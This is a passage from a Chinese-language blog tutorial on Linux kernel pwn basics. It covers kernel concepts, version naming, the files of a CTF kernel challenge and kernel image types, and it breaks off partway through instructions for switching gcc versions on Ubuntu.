<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            linux kernel pwn 基础知识 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">30</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux kernel pwn 基础知识</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 20:23:30</span>
        <span class="mobile">2024-11-08 20:23:30</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-12-27 01:17:10</span>
            <span class="mobile">2024-12-27 01:17:10</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/linux-kernel-pwn/">linux kernel pwn</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-kernel-pwn/">linux kernel pwn</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>57.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>243 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="linux-内核概述"><a href="#linux-内核概述" class="headerlink" title="linux 内核概述"></a>linux 内核概述</h1><p>Linux 内核由 Linus Torvalds 于 1991 年开发，最初的目的是为 Intel 80386 处理器编写一个类 UNIX 系统的内核。当前版本的 Linux 内核由全球社区共同开发维护，通过 Git 管理源代码。</p>
<h2 id="内核概述"><a href="#内核概述" class="headerlink" title="内核概述"></a>内核概述</h2><p>内核（Kernel）是操作系统的核心部分，负责管理硬件资源并提供给用户程序使用。它充当硬件和应用程序之间的桥梁，是操作系统最基础和最关键的部分。</p>
<h3 id="内核的职责"><a href="#内核的职责" class="headerlink" title="内核的职责"></a>内核的职责</h3><ul>
<li><p><strong>进程管理</strong>：</p>
<ul>
<li><p>负责调度 CPU，确保多个进程可以并发运行。</p>
</li>
<li><p>通过调度算法分配 CPU 时间片。</p>
</li>
<li><p>进程的创建、终止、状态切换和通信。</p>
</li>
</ul>
</li>
<li><p>内存管理：</p>
<ul>
<li>分配和释放内存，防止内存冲突。</li>
<li>提供虚拟内存支持，使每个进程有独立的地址空间。</li>
<li>管理分页（Paging）和分段（Segmentation）。</li>
</ul>
</li>
<li><p><strong>文件系统管理</strong>：</p>
<ul>
<li>提供文件读写接口。</li>
<li>管理存储设备（如硬盘）的文件组织和访问权限。</li>
<li>提供文件系统抽象层，支持多种文件系统（如 FAT32、NTFS、ext4）。</li>
</ul>
</li>
<li><p><strong>设备驱动管理</strong>：</p>
<ul>
<li>通过驱动程序控制硬件设备（如键盘、显示器、网卡）。</li>
<li>提供统一的设备访问接口。</li>
</ul>
</li>
<li><p><strong>网络管理</strong>：</p>
<ul>
<li>提供网络协议栈（如 TCP&#x2F;IP）支持网络通信。</li>
<li>管理数据包发送、接收和路由。</li>
</ul>
</li>
<li><p><strong>安全和权限管理</strong>：</p>
<ul>
<li>用户权限隔离，防止进程间相互干扰。</li>
<li>控制资源访问权限，保障系统安全。</li>
</ul>
</li>
</ul>
<h3 id="内核的分类"><a href="#内核的分类" class="headerlink" title="内核的分类"></a>内核的分类</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/998ca0e31c4c3ed139bb7b1d1d05e3e4.png"
                     
                ></p>
<ul>
<li><strong>单体内核（Monolithic Kernel）</strong>：所有的核心功能（如进程管理、内存管理、文件系统等）都在内核态运行。<ul>
<li>优点：性能高，系统调用开销低。</li>
<li>缺点：模块之间耦合度高，出错影响整个系统。</li>
<li>示例：Linux、BSD。</li>
</ul>
</li>
<li><strong>微内核（Microkernel）</strong>：仅保留最基础功能（如进程管理、内存管理）在内核态，其他功能移到用户态。<ul>
<li>优点：模块化设计，稳定性高。</li>
<li>缺点：性能低，系统调用开销大。</li>
<li>示例：Minix、QNX。</li>
</ul>
</li>
<li><strong>混合内核（Hybrid Kernel）</strong>：结合单体内核和微内核的优点，将部分功能运行在内核态，部分功能在用户态。<ul>
<li>示例：Windows NT、macOS。</li>
</ul>
</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>Linux 内核属于单体内核，所有核心功能（如进程管理、内存管理、设备驱动、文件系统、网络协议栈等）都运行在内核态。相较于微内核，单体内核性能更高，但模块之间高度耦合可能导致稳定性问题。</p>

    </div>
  </div>

<h2 id="Linux-内核的特点"><a href="#Linux-内核的特点" class="headerlink" title="Linux 内核的特点"></a>Linux 内核的特点</h2><ul>
<li><strong>模块化设计</strong>：Linux 内核的模块（Kernel Module）可以在运行时动态加载（<code>insmod</code>）或卸载（<code>rmmod</code>）。这使得开发人员无需重启系统或重新编译整个内核即可调试或扩展功能。</li>
<li><strong>高性能</strong>：<ul>
<li><strong>任务调度优化</strong>：使用 <code>CFS</code> 调度器（完全公平调度器），实现低延迟和公平的任务分配。</li>
<li><strong>多核支持</strong>：充分利用多核架构，通过锁机制（如自旋锁、读写锁）实现高效并发。</li>
<li><strong>零拷贝机制</strong>：网络通信中采用零拷贝技术，减少内存复制，提高吞吐量。</li>
</ul>
</li>
<li><strong>可移植性</strong>：支持多种硬件架构（x86、ARM、RISC-V 等）。可裁剪内核以适配嵌入式设备，同时也支持大规模服务器的多线程与并发。</li>
<li><strong>开源性</strong>：Linux 内核使用 GPLv2 许可证，全球社区通过邮件列表和补丁贡献，推动内核发展，并且所有修改和发布的代码必须开源。</li>
<li><strong>强大网络支持</strong>：内核内置高性能的网络协议栈，支持 IPv4、IPv6、UDP、ICMP 等。支持现代网络协议（如 QUIC）、SDN（软件定义网络）和虚拟网络（如 VXLAN）。</li>
</ul>
<h2 id="Linux-内核版本"><a href="#Linux-内核版本" class="headerlink" title="Linux 内核版本"></a>Linux 内核版本</h2><p>Linux 内核版本是社区开发和维护的核心之一，用于标识不同阶段的功能、性能和稳定性。</p>
<h3 id="版本命名规则"><a href="#版本命名规则" class="headerlink" title="版本命名规则"></a>版本命名规则</h3><p>Linux 内核版本号通常由三个或四个部分组成，格式为 <code>X.Y.Z</code>：</p>
<p><strong><code>X</code>（主版本号）</strong>：表示重大更新，例如架构变更或核心功能的大幅改进。例如：从 4.x 升级到 5.x。</p>
<p><strong><code>Y</code>（次版本号）</strong>：表示新功能和优化的引入。例如：5.10 中引入新的文件系统优化。</p>
<p><strong><code>Z</code>（修订号）</strong>：表示漏洞修复或小的改进。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>在 2.x 内核中，奇数表示开发版本，偶数表示稳定版本；从 3.x 开始废弃这种规则。</p>

    </div>
  </div>

<h3 id="版本的类型"><a href="#版本的类型" class="headerlink" title="版本的类型"></a>版本的类型</h3><p>Linux 内核由社区主导开发，Linux 内核大约每 <strong>8-10 周</strong>发布一个新版本。每个版本的开发分为两个阶段：</p>
<ul>
<li><p><strong>合并窗口（Merge Window）</strong>：开始时为期两周的功能合并窗口，开发者提交新功能和重大改进。结束后，停止接收新功能，只修复问题。</p>
</li>
<li><p><strong>修复阶段</strong>：剩下的时间用于 Bug 修复和代码优化。随着 RC（Release Candidate，候选版本）的发布逐步接近稳定。</p>
</li>
</ul>
<p>内核版本在发布前会经历多个 RC 版本（<code>X.Y-rcN</code>），如 <code>5.15-rc3</code>。每个 RC 版本修复前一版本发现的问题，直到版本足够稳定。</p>
<p>一些特定版本由社区标记为 LTS，生命周期通常为 2-6 年，适合生产环境。</p>
<h3 id="当前活跃的内核版本"><a href="#当前活跃的内核版本" class="headerlink" title="当前活跃的内核版本"></a>当前活跃的内核版本</h3><ul>
<li><strong>4.14</strong>：嵌入式设备常用，2017 年 11 月发布，支持至 2024 年。</li>
<li><strong>4.19</strong>：许多稳定性优化，2018 年 10 月发布，支持至 2024 年。</li>
<li><strong>5.4</strong>：企业环境常见，2019 年 11 月发布，支持至 2025 年。</li>
<li><strong>5.10</strong>：多场景支持，稳定，2020 年 12 月发布，支持至 2026 年。</li>
<li><strong>5.15</strong>：改进 <code>IO_uring</code> 和文件系统，2021 年 11 月发布，支持至 2028 年。</li>
<li><strong>6.x 系列</strong>：最新的长期支持版本。</li>
</ul>
<h3 id="查看系统版本"><a href="#查看系统版本" class="headerlink" title="查看系统版本"></a>查看系统版本</h3><h4 id="uname-命令"><a href="#uname-命令" class="headerlink" title="uname 命令"></a>uname 命令</h4><p><code>uname</code> 是一个标准命令，用于显示系统信息，其中 <code>-r</code> 参数用于显示当前运行的内核版本。如果想获取更详细的信息，可以使用 <code>uname</code> 的 <code>-a</code> 参数：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">uname</span> -r</span><br><span class="line">5.15.0-50-generic</span><br><span class="line">/ $ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu 5.15.0-50-generic <span class="comment">#56~20.04.1-Ubuntu SMP Thu Sep 29 19:22:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>Linux</code>：内核名称。</p>
</li>
<li><p><code>ubuntu</code>：主机名。</p>
</li>
<li><p><code>5.15.0-50-generic</code>：内核版本。</p>
<ul>
<li><p><code>5.15.0</code>：内核的主版本号和次版本号。</p>
</li>
<li><p><code>-50</code>：分配给当前内核版本的修订编号。</p>
<p><code>generic</code>：特定的内核类型，表示为通用内核。</p>
</li>
<li><p>其他可能的值：</p>
<ul>
<li><code>lowlatency</code>：低延迟内核。</li>
<li><code>rt</code>：实时内核。</li>
</ul>
</li>
</ul>
</li>
<li><p><code>#56~20.04.1-Ubuntu SMP Thu Sep 29 19:22:06 UTC 2022</code>：</p>
<ul>
<li><p><code>#56</code>：编译版本号。</p>
</li>
<li><p><code>SMP</code>：表示支持多处理器（Symmetric Multi-Processing）。</p>
</li>
<li><p><code>Thu Sep 29 19:22:06 UTC 2022</code>：编译日期和时间。</p>
</li>
</ul>
</li>
<li><p><code>x86_64</code>：CPU 架构。</p>
</li>
</ul>
<h4 id="查看-proc-version-文件"><a href="#查看-proc-version-文件" class="headerlink" title="查看 /proc/version 文件"></a>查看 <code>/proc/version</code> 文件</h4><p>Linux 将内核版本信息存储在 <code>/proc/version</code> 文件中，可以通过 <code>cat</code> 命令查看：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">Linux version 5.15.0-50-generic (buildd@lcy02-amd64-087) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils <span class="keyword">for</span> Ubuntu) 2.34) <span class="comment">#56~20.04.1-Ubuntu SMP Thu Sep 29 19:22:06 UTC 2022</span></span><br></pre></td></tr></table></figure></div>

<h1 id="kernel-pwn-环境基础"><a href="#kernel-pwn-环境基础" class="headerlink" title="kernel pwn 环境基础"></a>kernel pwn 环境基础</h1><p>在 ctf 中通常一个 kernel pwn 的题目包含下面三个部分：</p>
<ul>
<li><code>boot.sh</code>&#x2F;<code>run.sh</code>&#x2F;<code>start.sh</code>：启动脚本</li>
<li><code>bzImage</code>：内核镜像</li>
<li><code>rootfs.cpio</code>&#x2F;<code>rootfs.img</code>：文件系统</li>
</ul>
<p>另外还有可能提供用于编译内核的配置文件。</p>
<h2 id="内核镜像"><a href="#内核镜像" class="headerlink" title="内核镜像"></a>内核镜像</h2><h3 id="内核镜像的类别"><a href="#内核镜像的类别" class="headerlink" title="内核镜像的类别"></a>内核镜像的类别</h3><p>通常我们见到的内核镜像如下：</p>
<ul>
<li><p>vmlinux：vmlinux 是一个包含完整调试符号的内核映像文件，通常用于内核的开发和调试。它是未压缩的、包含所有调试符号的原始内核镜像。</p>
</li>
<li><p>bzImage：bzImage 是一个压缩过的内核映像，通常用于系统启动时的内核加载。<code>bzImage</code> 的名字来自于 <code>bzip2</code> 压缩工具，但实际上，它可以使用多种压缩算法（如 <code>gzip</code>、<code>bzip2</code> 等）来压缩内核。</p>
</li>
<li><p>vmlinuz：<code>vmlinuz</code> 是 Linux 内核的压缩映像文件，通常是 <code>bzImage</code> 文件的一个符号链接。它的名称遵循惯例，并且是广泛用于启动过程中的标准内核文件名称。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /boot/vmlinuz</span><br><span class="line">lrwxrwxrwx 1 root root 22 2024-12-01 16:23 /boot/vmlinuz -&gt; vmlinuz-5.10.0-7-amd64</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="获取-vmlinux"><a href="#获取-vmlinux" class="headerlink" title="获取 vmlinux"></a>获取 vmlinux</h3><h4 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h4><p>首先通过 <code>file</code> 命令查看内核版本：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 5.17.0 (ubuntu@ubuntu) <span class="comment">#3 SMP PREEMPT Fri Dec 6 16:57:22 CST 2024, RO-rootFS, swap_dev 0X9, Normal VGA</span></span><br></pre></td></tr></table></figure></div>

<p>并且最好确定编译内核的 gcc 版本，防止因为 gcc 版本差异过大导致内核编译失败。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings ./bzImage | grep gcc</span><br><span class="line">5.17.0 (ubuntu@ubuntu) (gcc (Ubuntu 13.2.0-23ubuntu4) 13.2.0, GNU ld (GNU Binutils <span class="keyword">for</span> Ubuntu) 2.42) <span class="comment">#3 SMP PREEMPT Fri Dec 6 16:57:22 CST 2024</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>ubuntu 切换 gcc 版本的方法</strong> </p>
<p>首先 <code>apt-cache</code> 查看可用的 gcc 版本信息：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ apt-cache policy gcc-13</span><br><span class="line">gcc-13:</span><br><span class="line">  Installed: 13.2.0-23ubuntu4</span><br><span class="line">  Candidate: 13.2.0-23ubuntu4</span><br><span class="line">  Version table:</span><br><span class="line"> *** 13.2.0-23ubuntu4 500</span><br><span class="line">        500 http://archive.ubuntu.com/ubuntu noble/main amd64 Packages</span><br><span class="line">        100 /var/lib/dpkg/status</span><br></pre></td></tr></table></figure></div>

<p>安装一个版本比较接近的 gcc。（对于比较上古的 linux 内核，需要找一些同样比较上古版本的 ubuntu 才能找到合适的 gcc 以及其他编译时用到的工具链。）</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gcc-13=13.2.0-23ubuntu4</span><br></pre></td></tr></table></figure></div>

<p><code>update-alternatives</code> 是一个 Debian 和 Ubuntu 系统中的命令行工具，用于管理系统中多个版本的程序之间的选择。这里将系统上安装的不同版本的 gcc 都添加到 <code>update-alternatives</code> 中：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-14 14</span><br><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-13 13</span><br></pre></td></tr></table></figure></div>

<p>之后只需要使用 <code>sudo update-alternatives --config gcc</code> 切换 gcc（本质就是更改</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ gcc --version</span><br><span class="line">gcc (Ubuntu 14.2.0-4ubuntu2~24.04) 14.2.0</span><br><span class="line">Copyright (C) 2024 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> update-alternatives --config gcc</span><br><span class="line">There are 2 choices <span class="keyword">for</span> the alternative gcc (providing /usr/bin/gcc).</span><br><span class="line"></span><br><span class="line">  Selection    Path             Priority   Status</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* 0            /usr/bin/gcc-14   14        auto mode</span><br><span class="line">  1            /usr/bin/gcc-13   13        manual mode</span><br><span class="line">  2            /usr/bin/gcc-14   14        manual mode</span><br><span class="line"></span><br><span class="line">Press &lt;enter&gt; to keep the current choice[*], or <span class="built_in">type</span> selection number: 